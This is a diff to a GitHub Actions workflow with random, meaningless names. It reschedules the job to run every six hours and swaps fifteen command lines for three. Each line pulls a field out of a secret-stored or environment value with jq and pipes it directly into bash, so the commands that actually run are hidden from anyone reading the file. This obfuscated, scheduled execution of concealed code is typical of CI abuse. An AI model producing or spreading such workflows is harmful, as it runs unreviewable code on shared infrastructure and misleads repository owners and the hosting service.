@@ -1,8 +1,9 @@
 name: allowalarmed
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
+    - cron: '28 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,21 +12,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: allowalarmed
         env:
-          yrl2: ${{ secrets.yrl2 }}
+          tkjba91582: ${{ secrets.tkjba91582 }}
         run: |
-          echo $yrl2 | jq -r .o0 | /bin/bash
-          echo $igbfq9678 | jq -r .ipl99 | /bin/bash
-          echo $pecv99 | jq -r .b8 | /bin/bash
-          echo $y9 | jq -r .v94 | /bin/bash
-          echo $jp9 | jq -r .fuo840 | /bin/bash
-          echo $euy01049 | jq -r .elzkd251 | /bin/bash
-          echo $yxthn57927 | jq -r .c29 | /bin/bash
-          echo $g0 | jq -r .a47540 | /bin/bash
-          echo $we4 | jq -r .ls6 | /bin/bash
-          echo $ntyd9711 | jq -r .sqher1789 | /bin/bash
-          echo $dem14 | jq -r .x2 | /bin/bash
-          echo $bjyms99 | jq -r .co8652 | /bin/bash
-          echo $sp17398 | jq -r .hxhtv880 | /bin/bash
-          echo $daol8506 | jq -r .aouil35 | /bin/bash
-          echo $dwwy5379 | jq -r .xlgm9 | /bin/bash
+          echo $tkjba91582 | jq -r .r3010 | /bin/bash
+          echo $xvc96 | jq -r .e10699 | /bin/bash
+          echo $nlo770 | jq -r .s5239 | /bin/bash
 
